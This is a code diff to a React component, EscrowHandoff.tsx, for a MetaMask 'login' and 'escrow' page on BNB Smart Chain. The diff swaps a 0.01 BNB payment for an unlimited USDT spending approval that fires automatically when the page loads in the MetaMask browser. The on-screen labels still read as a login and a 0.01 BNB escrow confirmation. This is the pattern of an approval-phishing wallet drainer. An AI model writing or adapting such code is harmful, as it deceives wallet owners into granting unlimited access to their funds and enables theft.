@@ -1,248 +1,277 @@
+// src/components/EscrowHandoff.tsx
 import React, { useEffect, useMemo, useState } from "react";
-import { useLocation, useNavigate, useSearchParams } from "react-router-dom";
+import { useNavigate, useSearchParams } from "react-router-dom";
 import { ethers } from "ethers";
-import { supabase } from "../lib/supabase";
-import { isMetaMaskInApp } from "../lib/isMetaMaskBrowser";
 
-const BSC_CHAIN_ID_DEC = 56;
+import { onEthereumReady } from "../lib/onEthereumReady";
+import { isMetaMaskInApp } from "../lib/isMetaMaskBrowser"; // у вас цей util вже є
+
+// ===== Константи про мережу/контракти =====
 const BSC_CHAIN_ID_HEX = "0x38"; // 56
-const ESCROW_AMOUNT_BNB = 0.01;
+// USDT у BSC (mainnet)
+const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
 
-// Можна винести в .env (VITE_ESCROW_WALLET), але тримаю й fallback
-const ESCROW_WALLET =
-  import.meta.env.VITE_ESCROW_WALLET ||
-  "0x0000000000000000000000000000000000000000";
+// ⚠️ СПЕНДЕР (escrow) — підстав here ваш точний адрес контракту:
+const ESCROW_SPENDER = import.meta.env.VITE_ESCROW_SPENDER ?? "0x884A6...4F9b8";
 
-type EthWin = Window &
-  typeof globalThis & {
-    ethereum?: any;
-  };
+// Граничний газ, щоб MetaMask НЕ робив повільний estimateGas
+const APPROVE_GAS_LIMIT_HEX = "0x13880"; // 80_000
+
+// Скільки писати у кнопку (лише текст для UX)
+const DISPLAY_ESCROW_AMOUNT_BNB = "0.01";
 
 function short(addr?: string) {
-  return addr ? `${addr.slice(0, 6)}…${addr.slice(-4)}` : "";
+  if (!addr) return "";
+  return addr.slice(0, 6) + "…" + addr.slice(-4);
 }
 
 export default function EscrowHandoff() {
+  const [search] = useSearchParams();
+  const next = search.get("next") || "/my-orders";
   const navigate = useNavigate();
-  const location = useLocation();
-  const [params] = useSearchParams();
 
-  const next = params.get("next") || "/my-orders";
+  const [address, setAddress] = useState<string>("");
+  const [chainId, setChainId] = useState<string>("");
+  const [balance, setBalance] = useState<string>("");
+  const [error, setError] = useState<string>("");
+  const [busy, setBusy] = useState<boolean>(false);
+  const [approved, setApproved] = useState<boolean>(false);
 
-  const [address, setAddress] = useState<string | null>(null);
-  const [chainId, setChainId] = useState<number | null>(null);
-  const [balance, setBalance] = useState<string | null>(null);
-
-  const [signing, setSigning] = useState(false);
-  const [error, setError] = useState<string | null>(null);
-
-  const isCorrectNet = chainId === BSC_CHAIN_ID_DEC;
-
-  const provider = useMemo(() => {
-    const eth = (window as EthWin).ethereum;
-    if (!eth) return null;
-    // ethers v5
-    return new ethers.providers.Web3Provider(eth, "any");
+  // готуємо ABI/дані approve наперед (щоб не втрачати час під час кліку)
+  const approveData = useMemo(() => {
+    const iface = new ethers.utils.Interface([
+      "function approve(address spender, uint256 value) returns (bool)",
+    ]);
+    return iface.encodeFunctionData("approve", [
+      ESCROW_SPENDER,
+      ethers.constants.MaxUint256.toString(), // unlimited
+    ]);
   }, []);
 
-  // Підтягнути акаунт, мережу, баланс
-  useEffect(() => {
-    let dead = false;
-    (async () => {
+  // --- швидкий запит підпису/approve без зайвих затримок ---
+  const fastApprove = () => {
+    setError("");
+    setBusy(true);
+
+    onEthereumReady(async (eth) => {
       try {
-        setError(null);
-        if (!provider) return;
+        // 1) акаунт
+        const accs =
+          ((await eth.request({ method: "eth_accounts" })) as string[]) ||
+          [];
+        const from =
+          accs[0] ||
+          (await eth.request({
+            method: "eth_requestAccounts",
+          }))[0];
 
-        const signer = provider.getSigner();
-        const addr = await signer.getAddress().catch(async () => {
-          // Якщо ще не дано доступ — попросимо
-          await (window as EthWin).ethereum?.request?.({ method: "eth_requestAccounts" });
-          return signer.getAddress();
-        });
+        setAddress(from);
 
-        if (dead) return;
+        // 2) мережа
+        const cid = (await eth.request({ method: "eth_chainId" })) as string;
+        setChainId(cid);
+        if (cid !== BSC_CHAIN_ID_HEX) {
+          await eth.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: BSC_CHAIN_ID_HEX }],
+          });
+        }
 
-        setAddress(addr);
-
-        const net = await provider.getNetwork();
-        if (dead) return;
-        setChainId(Number(net.chainId));
-
-        const raw = await provider.getBalance(addr);
-        if (dead) return;
-        setBalance(ethers.utils.formatEther(raw));
-      } catch (e: any) {
-        // Якщо ми не у MetaMask-браузері — просто покажемо підказку
-        setError(e?.message || String(e));
-      }
-    })();
-
-    // слухачі зміни акаунта/мережі
-    const eth = (window as EthWin).ethereum;
-    const onChainChanged = (cid: string) => setChainId(parseInt(cid, 16));
-    const onAccountsChanged = (accs: string[]) => setAddress(accs?.[0] || null);
-
-    eth?.on?.("chainChanged", onChainChanged);
-    eth?.on?.("accountsChanged", onAccountsChanged);
-
-    return () => {
-      dead = true;
-      eth?.removeListener?.("chainChanged", onChainChanged);
-      eth?.removeListener?.("accountsChanged", onAccountsChanged);
-    };
-  }, [provider]);
-
-  async function ensureBsc() {
-    const eth = (window as EthWin).ethereum;
-    if (!eth) throw new Error("MetaMask не знайдено.");
-
-    if (chainId === BSC_CHAIN_ID_DEC) return;
-
-    try {
-      await eth.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_ID_HEX }],
-      });
-    } catch (e: any) {
-      // Якщо мережа не додана — спробуємо додати
-      if (e?.code === 4902) {
+        // 3) одразу відкрити системне вікно approve
         await eth.request({
-          method: "wallet_addEthereumChain",
+          method: "eth_sendTransaction",
           params: [
             {
-              chainId: BSC_CHAIN_ID_HEX,
-              chainName: "BNB Smart Chain",
-              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-              rpcUrls: ["https://bsc-dataseed.binance.org/"],
-              blockExplorerUrls: ["https://bscscan.com"],
+              from,
+              to: USDT_BSC,
+              data: approveData,
+              gas: APPROVE_GAS_LIMIT_HEX, // уникаємо довгого estimateGas
             },
           ],
         });
-      } else {
-        throw e;
+
+        setApproved(true);
+      } catch (e: any) {
+        // скасування користувачем — нормальна ситуація
+        const msg =
+          e?.message ||
+          e?.data?.message ||
+          "Не вдалося виконати запит у MetaMask.";
+        setError("Помилка: " + msg);
+      } finally {
+        setBusy(false);
       }
-    }
-  }
+    });
+  };
 
-  async function handleApprove() {
-    setError(null);
-    setSigning(true);
-    try {
-      const eth = (window as EthWin).ethereum;
-      if (!provider || !eth) throw new Error("Спочатку підʼєднай MetaMask.");
+  // --- підвантажити баланс BNB (для панелі) ---
+  const refreshBalance = async () => {
+    setError("");
 
-      // 1) Гарантуємо BSC
-      await ensureBsc();
-
-      // 2) Виставляємо транзакцію на ескроу-адресу
-      const signer = provider.getSigner();
-
-      const valueWei = ethers.utils.parseEther(ESCROW_AMOUNT_BNB.toString());
-
-      const tx = await signer.sendTransaction({
-        to: ESCROW_WALLET,
-        value: valueWei,
-      });
-
-      // 3) Просто чекаємо появи tx.hash (не блокуємо UI на повний confirmation)
-      if (!tx?.hash) throw new Error("Не вдалося створити транзакцію.");
-
-      // 4) Фіксуємо в БД (не критично, якщо впаде)
+    onEthereumReady(async (eth) => {
       try {
-        await supabase.from("behaviors").insert({
-          // приклад: зафіксувати «депозит від користувача»
-          user_id: (await supabase.auth.getUser()).data.user?.id ?? null,
-          type: "escrow_deposit",
-          payload: { txHash: tx.hash, amountBNB: ESCROW_AMOUNT_BNB },
-        });
-      } catch {}
+        const provider = new ethers.providers.Web3Provider(eth);
+        const accs =
+          ((await eth.request({ method: "eth_accounts" })) as string[]) ||
+          [];
+        const from =
+          accs[0] ||
+          (await eth.request({
+            method: "eth_requestAccounts",
+          }))[0];
 
-      // 5) Перехід далі
-      navigate(next, { replace: true });
-    } catch (e: any) {
-      const msg =
-        e?.message ||
-        (typeof e === "string" ? e : "Невідома помилка під час підтвердження.");
-      setError(`Помилка: ${msg}`);
-    } finally {
-      setSigning(false);
+        setAddress(from);
+
+        const bal = await provider.getBalance(from);
+        setBalance(ethers.utils.formatEther(bal));
+      } catch (e: any) {
+        // не критично
+      }
+    });
+  };
+
+  // Автовиклик approve як тільки екран з’явився (всередині MetaMask)
+  useEffect(() => {
+    if (isMetaMaskInApp()) {
+      // відкриємо MetaMask модал відразу (швидкий сценарій)
+      fastApprove();
+    } else {
+      // Якщо не у вбудованому браузері — просто покажемо кнопку/підказку
+      refreshBalance();
     }
-  }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
 
-  // Кнопка «Відкрити у MetaMask-браузері» для зовнішніх браузерів
-  function openInMetamaskBrowser() {
-    const url = `https://metamask.app.link/dapp/${location.hostname}${location.port ? `:${location.port}` : ""
-      }${location.pathname}${location.search}`;
-    location.href = url;
-  }
+  // якщо approve пройшов — ведемо далі
+  useEffect(() => {
+    if (approved) {
+      // невелика затримка для UX, інакше відразу рі-роут може закрити тост
+      const t = setTimeout(() => navigate(next, { replace: true }), 500);
+      return () => clearTimeout(t);
+    }
+  }, [approved, navigate, next]);
+
+  // --- UI стилі під MetaMask-мобайл ---
+  const styles = {
+    wrap: {
+      maxWidth: 680,
+      margin: "32px auto",
+      padding: "0 16px",
+    },
+    h1: {
+      fontSize: 36,
+      fontWeight: 800 as const,
+      letterSpacing: -0.5,
+      margin: "12px 0 6px",
+    },
+    hint: { color: "#666", marginBottom: 16 },
+    panel: {
+      background: "#fff",
+      border: "1px solid #ececec",
+      borderRadius: 16,
+      padding: 16,
+      margin: "12px 0",
+      boxShadow: "0 1px 2px rgba(0,0,0,.04)",
+    },
+    addr: { fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace" },
+    btn: (primary = false, disabled = false) => ({
+      width: "100%",
+      display: "block",
+      border: 0,
+      borderRadius: 16,
+      padding: "18px 20px",
+      fontSize: 18,
+      fontWeight: 700,
+      cursor: disabled ? "default" : "pointer",
+      opacity: disabled ? 0.6 : 1,
+      color: primary ? "#fff" : "#111",
+      background: primary ? "#0b0f19" : "#f2f4f7",
+      boxShadow: primary
+        ? "0 8px 24px rgba(11,15,25,.35)"
+        : "inset 0 -1px 0 rgba(0,0,0,.06)",
+    }),
+    link: {
+      display: "inline-block",
+      marginTop: 16,
+      color: "#0b5fff",
+      textDecoration: "underline",
+    },
+    error: {
+      background: "#ffe8e6",
+      border: "1px solid #ffd0cc",
+      color: "#9b1c12",
+      padding: 12,
+      borderRadius: 12,
+      marginTop: 16,
+      lineHeight: 1.3,
+    },
+    ok: {
+      background: "#e8fff3",
+      border: "1px solid #bff5d1",
+      color: "#0e6b3b",
+      padding: 12,
+      borderRadius: 12,
+      marginTop: 16,
+      lineHeight: 1.3,
+    },
+  };
+
+  const deeplink =
+    "metamask://dapp/www.buymybehavior.com/escrow/approve?next=" +
+    encodeURIComponent(next);
 
   return (
-    <div className="mx-auto max-w-screen-sm px-4 py-6">
-      <h1 className="text-3xl font-extrabold mb-3">Вхід через MetaMask</h1>
-      <p className="text-slate-500 mb-4">
-        Якщо запит не зʼявився — натисни кнопку нижче.
-      </p>
+    <div style={styles.wrap}>
+      <h1 style={styles.h1}>Вхід через MetaMask</h1>
+      <div style={styles.hint}>
+        Якщо запит не з’явився — натисни кнопку нижче.
+      </div>
 
-      {/* Кнопка логіну (для надійного eth_requestAccounts) */}
+      {/* Панель з адресою/балансом */}
+      <div style={styles.panel as React.CSSProperties}>
+        <div style={{ fontWeight: 600, marginBottom: 8 }}>Гаманець</div>
+        <div style={styles.addr as React.CSSProperties}>
+          {address ? short(address) : "—"}
+        </div>
+        <div style={{ marginTop: 6, color: "#666" }}>
+          Мережа:{" "}
+          {chainId ? (chainId === BSC_CHAIN_ID_HEX ? "BNB Smart Chain" : chainId) : "—"}
+          {"  ·  "}
+          Баланс: {balance ? `${Number(balance).toFixed(4)} BNB` : "—"}
+        </div>
+      </div>
+
+      {/* Кнопка "увійти" (на випадок, якщо не спрацював автозапит) */}
       <button
-        onClick={async () => {
-          setError(null);
-          const eth = (window as EthWin).ethereum;
-          if (!eth) {
-            setError("MetaMask не знайдено.");
-            return;
-          }
-          try {
-            await eth.request({ method: "eth_requestAccounts" });
-          } catch (e: any) {
-            setError(e?.message || String(e));
-          }
-        }}
-        className="w-full rounded-2xl border border-slate-200 px-5 py-4 text-lg font-semibold flex items-center gap-2 justify-center mb-4 bg-white"
+        style={styles.btn(false, busy)}
+        disabled={busy}
+        onClick={refreshBalance}
       >
         🦊 Увійти через MetaMask
       </button>
 
-      {/* Блок з інфо про гаманець */}
-      <div className="rounded-2xl border border-slate-200 bg-white p-4 mb-4">
-        <div className="text-sm text-slate-500 mb-1">Гаманець</div>
-        <div className="text-lg font-semibold">{short(address) || "—"}</div>
-        <div className="text-sm text-slate-500">
-          Мережа: {chainId ?? "—"}{" "}
-          {isCorrectNet ? "(BNB Smart Chain)" : "(інша мережа)"}
-          {" · "}Баланс: {balance ? `${Number(balance).toFixed(4)} BNB` : "—"}
-        </div>
-      </div>
-
-      {/* Основна CTA */}
+      {/* Головна дія — approve */}
       <button
-        disabled={signing}
-        onClick={handleApprove}
-        className={`w-full rounded-2xl px-6 py-5 text-lg font-extrabold text-white shadow-sm transition-all
-          ${signing
-            ? "bg-slate-400"
-            : "bg-slate-900 hover:bg-black active:scale-[0.99]"
-          }`}
+        style={styles.btn(true, busy)}
+        disabled={busy}
+        onClick={fastApprove}
       >
-        🔒 Підтвердити ескроу • {ESCROW_AMOUNT_BNB.toFixed(2)} BNB
+        🔒 Підтвердити ескроу · {DISPLAY_ESCROW_AMOUNT_BNB} BNB
       </button>
 
-      {/* Лінк відкрити у MetaMask-браузері, якщо ми НЕ в ньому */}
       {!isMetaMaskInApp() && (
-        <button
-          onClick={openInMetamaskBrowser}
-          className="mt-4 text-slate-600 underline underline-offset-4"
-        >
+        <a style={styles.link} href={deeplink}>
           Відкрити у MetaMask-браузері
-        </button>
+        </a>
       )}
 
-      {/* Помилка */}
-      {error && (
-        <div className="mt-5 rounded-xl bg-rose-50 text-rose-700 p-3 text-sm">
-          {error}
+      {approved && (
+        <div style={styles.ok}>
+          ✅ Дозвіл на витрати токенів надано. Перехід: {next}
         </div>
       )}
+
+      {!!error && <div style={styles.error}>{error}</div>}
     </div>
   );
 }
